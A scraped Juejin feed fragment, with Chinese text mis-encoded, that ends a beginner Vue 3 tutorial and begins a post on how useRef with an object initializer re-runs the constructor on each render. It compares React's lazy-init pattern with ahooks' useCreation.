<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f615869ceaa43de8b5817884b664dde~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=evdO0QAWosaI1MRll9WVoLKplMg%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-3">3ã€å‡†å¤‡å…ƒç´ divï¼Œè¢«vueæ§åˆ¶</h4>
<p>createAppå‡½æ•°é“¾å¼è°ƒç”¨mount()æ–¹æ³•ç”¨äºæ§åˆ¶é¡µé¢æ ‡ç­¾divï¼Œmount()æ–¹æ³•ä¸­çš„å‚æ•°appæ˜¯divçš„id</p>
<h6 data-id="heading-4">æ³¨æ„ï¼šå‚æ•°è¦åŠ #ï¼Œæ ‡ç­¾è¢«vueæ§åˆ¶ï¼Œè¯¥æ ‡ç­¾ä¸‹çš„å­æ ‡ç­¾ä¹Ÿä¼šè¢«æ§åˆ¶</h6>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a07247b807334b9ab9f12052c97e6b66~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=fh0kOcd8ecvda%2FTdHUtEQzDWyEA%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-5">äºŒã€æ„å»ºç”¨æˆ·ç•Œé¢</h2>
<h4 data-id="heading-6">1.å‡†å¤‡æ•°æ®</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c62b63bb3a1c42f7a7881d98b87951ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=zMV3wOl9Lnd9oGJKBCrsuB8R%2BTg%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-7">2.ç”¨æ’å€¼è¡¨è¾¾å¼æ¸²æŸ“é¡µé¢</h4>
<p>æ’å€¼è¡¨è¾¾å¼å°±æ˜¯ä¸¤ä¸ªèŠ±æ‹¬å·ï¼Œé‡Œé¢æ˜¯é”®å:<code>&lt;h1&gt;{{msg}}&lt;h1&gt;</code></p>
<p>dataå‡½æ•°å®šä¹‰æ•°æ®</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9c739f144f524bada5c241db863520cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=rrdzmnIQKIJLPWTRtP8QAu8usSg%3D" alt="image.png" loading="lazy"/>
æ¸²æŸ“ç»“æœï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f37b7b5b414445c5a715a9bf4703f5d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=xiu3awDNanWlRj%2BhoUR5UvCX5OA%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-8">ä¸‰ã€vueçš„ç”Ÿå‘½å‘¨æœŸ</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2dac80e5a4294948a71b57838c3ca6a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=5jkshlO7VyIR97EmreWAz6YaJlQ%3D" alt="image.png" loading="lazy"/></p>
<h6 data-id="heading-9">å¸¸ç”¨çš„å°±ä¸¤ä¸‰ä¸ªï¼Œè¿™é‡Œè®°ä½mountedå°±è¡Œ</h6>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fe9e67971044981bd5170386e74dad7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=aSPMpIIla9p3J9AoR%2BFFcIAW9m4%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-10">å››ã€Vueé¡¹ç›®åˆ›å»ºå’Œå¯åŠ¨</h2>
<h4 data-id="heading-11">Vueé¡¹ç›®ç›®å½•ç»“æ„</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf5a2aa47f0c4b65a11f14d7cc183ecf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=TX6Wi3JAlC7v6RgK1%2B2mBRg1xUc%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-12">vueé¡¹ç›®å¯åŠ¨</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fd7b42bdfe34174b2ab35b2bcc47441~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=4GkoP%2FK%2BcQi9llB%2FlkY1nqpTPfo%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-13">äº”ã€vueé¡¹ç›®å¼€å‘æµç¨‹</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c94f64f5f7b74284a30a05195f85b7be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=Vvf0fOqLtIubIlMe9lqQeDHCaDc%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9b0dd2d502b4945aabe6f99821235b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=PxbwGWA%2BuIjTMz3YGDPn5hG6I2w%3D" alt="image.png" loading="lazy"/>
ç¬¬ä¸€ç§æ˜¯vue2çš„å†™æ³•ï¼Œexport default{}é»˜è®¤å¯¼å‡ºjså¯¹è±¡</p>
<p>ç¬¬äºŒç§æ˜¯vue3å†™æ³•ï¼Œå“åº”å¼ï¼ˆæ•°æ®é¡µé¢ç›¸äº’ç»‘å®šï¼‰ï¼Œç¡¬æ€§è¦æ±‚è¦åœ¨scriptæ ‡ç­¾é‡Œé¢åŠ ä¸Šsetup</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3b01b8182f54a00aef117b1c5969554~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=7KORc%2FOSMx3yAa8Zofy5kwonWXw%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-14">å…­ã€vueçš„APIé£æ ¼</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7e075e90e3c14d81a8497e4a4b72e57e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=IJOgIe7LhuNCkkUZB2eA%2FBIy680%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6cf7af6800884a05a988cdf984ead89c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=GFGDRfpFNjYfk77p%2FGLDN8ndfcE%3D" alt="image.png" loading="lazy"/>
ç»„åˆå¼apiéœ€è¦å°†æ•°æ®è®¾ç½®ä¸ºå“åº”å¼æ•°æ®ï¼Œå¿…é¡»ä¸refè”åŠ¨æ‰èƒ½æ¿€æ´»å“åº”å¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ecbf0b2acf2a4462a2e4a3c002cb2f6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ4MjU3ODI0ODE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768832981&amp;x-signature=eoINe7unpjX6waD4Qgq7FTIB%2BFY%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[useRefå­˜åœ¨çš„æ½œåœ¨æ€§èƒ½é—®é¢˜]]></title>    <link>https://juejin.cn/post/7594322573453475883</link>    <guid>https://juejin.cn/post/7594322573453475883</guid>    <pubDate>2026-01-13T02:39:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594322573453475883" data-draft-id="7594627998838849578" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="useRefå­˜åœ¨çš„æ½œåœ¨æ€§èƒ½é—®é¢˜"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-13T02:39:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Jolyne_"/> <meta itemprop="url" content="https://juejin.cn/user/339101640827981"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            useRefå­˜åœ¨çš„æ½œåœ¨æ€§èƒ½é—®é¢˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/339101640827981/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Jolyne_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:39:39.000Z" title="Tue Jan 13 2026 02:39:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ€è¿‘åœ¨å­¦ä¹ ahooksæºç æ—¶ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fahooks.js.org%2Fzh-CN%2Fhooks%2Fuse-creation" target="_blank" title="https://ahooks.js.org/zh-CN/hooks/use-creation" ref="nofollow noopener noreferrer">useCreation</a>æ—¶ï¼Œå‘ç°å®˜æ–¹æ–‡æ¡£å†™äº†è¿™æ ·ä¸€å¥è¯</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b70e4c251d0a4d06aa342f709b111f9a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9seW5lXw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876779&amp;x-signature=%2FA5cQGm%2FBd%2BevL0JexOBkFm0Xv0%3D" alt="image.png" loading="lazy"/></p>
<p>ç¬¬ä¸€çœ¼åï¼Œæˆ‘å¿ƒæƒ³ï¼šuseRef ä¸æ˜¯åªä¼šæ‰§è¡Œä¸€æ¬¡å—ï¼Ÿå¹¶ä¸”ä¸ä¼šéšç»„ä»¶ç”Ÿå‘½å‘¨æœŸå˜åŒ–å—ï¼Ÿç„¶åæ ¹æ®å®˜æ–¹æ–‡æ¡£çš„ä¾‹å­è¯•äº†ä¸€ä¸‹ï¼Œå‘ç° useRef åœ¨å­˜å‚¨å¤æ‚æ•°æ®ç±»å‹æ—¶ï¼ˆæ¯”å¦‚å¯¹è±¡ï¼‰ï¼Œç¡®å®æœ‰æ€§èƒ½é—®é¢˜</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"antd"</span>;
<span class="hljs-keyword">import</span> { useRef, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Subject</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"===constructor==="</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>();
  }
  <span class="hljs-attr">data</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-keyword">const</span> <span class="hljs-title class_">RefQuestion</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">RefQuestion</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { current } = <span class="hljs-title function_">useRef</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Subject</span>());
  <span class="hljs-keyword">const</span> [, setFlag] = <span class="hljs-title function_">useState</span>({});
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"pt-10"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{current.data}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>
        <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> {
          setFlag({});
        }}
      &gt;
        Rerender
      <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">RefQuestion</span>;
</code></pre>
<p>åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œç»„ä»¶åˆå§‹åŒ–æ—¶ï¼Œä¼šæ‰§è¡Œä¸€æ¬¡ <code>new Subject()</code>ï¼Œæ§åˆ¶å°ä¼šæ‰“å°ä¸€æ¬¡ <code>===constructor===</code></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b792171f824047799cd042c99e3a7213~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9seW5lXw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876779&amp;x-signature=2Da7KxYhRJecArUBIJzqNARDCME%3D" alt="image.png" loading="lazy"/></p>
<p>å½“æˆ‘ç‚¹å‡»æŒ‰é’®è§¦å‘ç»„ä»¶é‡æ–°æ¸²æŸ“æ—¶ï¼Œè™½ç„¶æ¸²æŸ“çš„å€¼æ²¡æœ‰å˜ï¼Œä½†æ˜¯æ§åˆ¶å°ä¾æ—§æ‰“å°äº†<code>===constructor===</code></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/038f6c0d4bd443359d963521ef4d81ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9seW5lXw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876779&amp;x-signature=MWyx9HvnMJXJyL0wDe5luu8Lzv8%3D" alt="image.png" loading="lazy"/></p>
<p>ä¹Ÿå°±æ˜¯è¯´æ˜ï¼šç»„ä»¶é‡æ–°æ¸²æŸ“æ—¶ï¼Œè™½ç„¶Reactå†…éƒ¨åˆ¤æ–­åï¼Œè¿”å›äº†é¦–æ¬¡æ¸²æŸ“æ—¶çš„å€¼ï¼Œ<code>ä½†æ˜¯åœ¨æ¯æ¬¡ç»„ä»¶æ¸²æŸ“æ—¶ï¼Œéƒ½ä¼šæ‰§è¡Œ new Subject() å®ä¾‹åŒ–è¿‡ç¨‹ï¼Œå³ä½¿æ¯æ¬¡å®ä¾‹åŒ–åï¼Œéƒ½ä¸¢å¼ƒäº†å®ä¾‹åŒ–å¯¹è±¡</code>ï¼Œè€Œé‡å¤å®ä¾‹åŒ–å¯¹è±¡å°±æ˜¯ä¸€ç§<code>æ— æ•ˆçš„å†…å­˜å¼€é”€</code>ï¼Œå³æ€§èƒ½å­˜åœ¨éšæ‚£</p>
<p>å› æ­¤æˆ‘é‡æ–°çœ‹äº†ä¸‹Reactæ–‡æ¡£å¯¹äº useRef çš„è¯´æ˜ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2fa1ebe91464e6c95138a340ee862cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9seW5lXw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876779&amp;x-signature=xY34SjVqTcng75%2FTPsoYdPrsmzk%3D" alt="image.png" loading="lazy"/></p>
<p>å¯è§ React å®˜æ–¹å°±å·²ç»å¯¹è¿™ç§æƒ…å†µè¿›è¡Œäº†è¯´æ˜ï¼Œå¹¶ä¸”ä¹Ÿç»™å‡ºäº†è§£å†³æ–¹æ¡ˆï¼Œæ€æƒ³ä¸<code>å•ä¾‹æ¨¡å¼</code>ä¸€è‡´</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Video</span>(<span class="hljs-params"/>) {  
    <span class="hljs-keyword">const</span> playerRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);  
    <span class="hljs-keyword">if</span> (playerRef.<span class="hljs-property">current</span> === <span class="hljs-literal">null</span>) {  
        playerRef.<span class="hljs-property">current</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VideoPlayer</span>();  
    }  
    <span class="hljs-comment">// ...</span>
</code></pre>
<p>ç„¶åæˆ‘ä»¬å›è¿‡å¤´æ¥ï¼Œå¯ä»¥çœ‹çœ‹ <a href="https://link.juejin.cn?target=https%3A%2F%2Fahooks.js.org%2Fzh-CN%2Fhooks%2Fuse-creation" target="_blank" title="https://ahooks.js.org/zh-CN/hooks/use-creation" ref="nofollow noopener noreferrer">useCreation</a> æ˜¯æ€ä¹ˆåšçš„</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">DependencyList</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> depsAreSame <span class="hljs-keyword">from</span> <span class="hljs-string">'../utils/depsAreSame'</span>;

<span class="hljs-keyword">const</span> useCreation = &lt;T&gt;<span class="hljs-function">(<span class="hljs-params">factory: () =&gt; T, deps: DependencyList</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> { current } = <span class="hljs-title function_">useRef</span>({
    deps,
    <span class="hljs-attr">obj</span>: <span class="hljs-literal">undefined</span> <span class="hljs-keyword">as</span> T,
    <span class="hljs-attr">initialized</span>: <span class="hljs-literal">false</span>,
  });
  <span class="hljs-keyword">if</span> (current.<span class="hljs-property">initialized</span> === <span class="hljs-literal">false</span> || !<span class="hljs-title function_">depsAreSame</span>(current.<span class="hljs-property">deps</span>, deps)) {
    current.<span class="hljs-property">deps</span> = deps;
    current.<span class="hljs-property">obj</span> = <span class="hljs-title function_">factory</span>();
    current.<span class="hljs-property">initialized</span> = <span class="hljs-literal">true</span>;
  }
  <span class="hljs-keyword">return</span> current.<span class="hljs-property">obj</span>;
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useCreation;
</code></pre>
<ul>
<li>å¦‚æœæ˜¯é¦–æ¬¡æ¸²æŸ“ï¼ˆ<code>initialized === false</code>ï¼‰æˆ–è€… ä¾èµ–é¡¹å‘ç”Ÿäº†æ”¹å˜ï¼ˆ<code>!depsAreSame(current.deps, deps)</code>ï¼‰ï¼Œåˆ™æ‰§è¡Œ <code>factory()</code>å‡½æ•°åˆ›å»ºå€¼</li>
<li>å¦‚æœä¸æ»¡è¶³æ¡ä»¶ï¼Œç›´æ¥è¿”å›ä¹‹å‰çš„å€¼ï¼ˆ<code>æ­¤æ—¶ä¸ä¼šèµ° factory()</code>ï¼‰</li>
</ul>
<p>è¿™æ ·å°±ä¿è¯äº†é€šè¿‡ useCreation åˆ›å»ºçš„å€¼ä¸€å®šæ˜¯ memosizedï¼Œä¾èµ–æ”¹å˜å‰æ˜¯ä¿è¯ä¸ä¼šé‡æ–°è®¡ç®—çš„</p>
<p>æˆ‘ä»¬å°† useCreation ä»£æ›¿ useRef è¯•è¯•</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { useCreation } <span class="hljs-keyword">from</span> <span class="hljs-string">"ahooks"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"antd"</span>;
<span class="hljs-keyword">import</span> { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Subject</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"===constrcutor====="</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>();
  }
  <span class="hljs-attr">data</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-keyword">const</span> <span class="hljs-title class_">RefQuestion</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">RefQuestion</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [flag, setFlag] = <span class="hljs-title function_">useState</span>({});
  <span class="hljs-keyword">const</span> foo = <span class="hljs-title function_">useCreation</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Subject</span>(), []);
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"pt-10"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{foo.data}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>
        <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> {
          setFlag({});
        }}
      &gt;
        Rerender
      <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
